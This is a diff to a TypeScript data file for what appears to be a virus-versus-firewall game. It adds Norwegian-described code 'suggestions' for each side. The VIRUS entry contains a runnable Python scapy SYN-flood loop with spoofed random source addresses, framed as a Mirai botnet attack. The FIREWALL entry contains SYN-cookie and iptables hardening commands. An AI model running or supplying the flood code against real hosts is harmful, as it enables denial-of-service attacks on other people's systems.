@@ -100,6 +100,16 @@ export const CODE_SUGGESTIONS_DB: CodeSuggestion[] = [
     impact: { virusPower: 25, breachDelta: 30, flawSeverityDiscovered: 45 },
   },
   {
+    id: 'sug-v-1-ddos',
+    side: 'VIRUS',
+    layerNumber: 1,
+    title: 'Mirai 100 Gbps SYN/UDP Botnet Surge',
+    description: 'Fyrer av 25 000 distribuerte botnett-noder med spoofede IP-er for å overmette brannmurens tilstandstabell.',
+    language: 'python',
+    code: `import scapy.all as scapy\nfor i in range(100000):\n    pkt = scapy.IP(src=scapy.RandIP(), dst="target")/scapy.TCP(dport=80, flags="S")\n    scapy.send(pkt, verbose=0)`,
+    impact: { virusPower: 45, breachDelta: 40, flawSeverityDiscovered: 60 },
+  },
+  {
     id: 'sug-f-1a',
     side: 'FIREWALL',
     layerNumber: 1,
@@ -108,6 +118,16 @@ export const CODE_SUGGESTIONS_DB: CodeSuggestion[] = [
     language: 'iptables',
     code: `# Umiddelbar brannmur-regel for a tette oppdelt WAF-omgaelse\niptables -A INPUT -p tcp --dport 3000 -m string --algo bm --string "Transfer-Encoding: chunked" -j REJECT --reject-with tcp-reset`,
     impact: { firewallDefense: 35, breachDelta: -40, flawSeverityDiscovered: -20 },
+  },
+  {
+    id: 'sug-f-1-ddos',
+    side: 'FIREWALL',
+    layerNumber: 1,
+    title: 'Anycast SYN-Cookie Proxy & BGP Scrubbing',
+    description: 'Aktiverer kryptografiske SYN-cookies for å validere TCP handshakes uten allokering av systemressurser.',
+    language: 'bash',
+    code: `# Skru pa Linux Kernel SYN-Cookies og BGP Anycast null-ruting\nsysctl -w net.ipv4.tcp_syncookies=1\nsysctl -w net.ipv4.tcp_max_syn_backlog=4096\niptables -t raw -A PREROUTING -p tcp -m tcp --syn -j CT --notrack`,
+    impact: { firewallDefense: 50, breachDelta: -55, flawSeverityDiscovered: -35 },
   },
 
   // LAYER 2 SUGGESTIONS
